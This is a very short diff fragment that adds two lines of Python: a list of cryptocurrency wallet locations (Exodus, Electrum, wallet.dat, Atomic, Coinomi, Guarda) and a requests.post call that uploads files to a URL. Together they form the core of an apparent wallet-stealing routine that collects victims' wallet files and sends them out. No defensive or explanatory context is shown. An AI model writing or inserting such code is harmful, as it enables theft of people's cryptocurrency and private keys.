@@ -1,0 +1,3 @@
+paths = ["Exodus\\exodus.wallet", "Electrum\\wallets", "wallet.dat", "Atomic\\Local Storage", "Coinomi", "Guarda"]
+requests.post(url, files=f)
+
